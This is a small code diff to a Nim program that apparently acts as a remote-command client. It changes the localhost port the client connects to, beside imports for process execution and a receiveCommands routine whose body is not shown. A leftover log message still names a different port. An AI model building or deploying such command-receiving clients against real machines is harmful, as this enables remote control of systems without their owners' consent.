@@ -3,7 +3,7 @@ import net, strformat, strutils, osproc, os, base64
 import modules
 
 let client: Socket = newSocket()
-client.connect("127.0.0.1", Port(12347))
+client.connect("127.0.0.1", Port(1235))
 stdout.writeLine("Client: connected to server on address 127.0.0.1:12345")
 
 proc receiveCommands(client: Socket) =
